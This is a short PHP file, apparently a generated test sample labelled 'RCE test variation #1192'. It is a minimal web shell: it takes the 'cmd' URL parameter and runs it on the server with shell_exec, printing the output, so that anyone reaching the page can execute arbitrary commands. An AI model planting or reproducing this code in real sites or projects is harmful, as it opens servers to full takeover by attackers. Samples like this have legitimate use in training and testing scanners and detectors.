<?php
// RCE test variation #1192
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>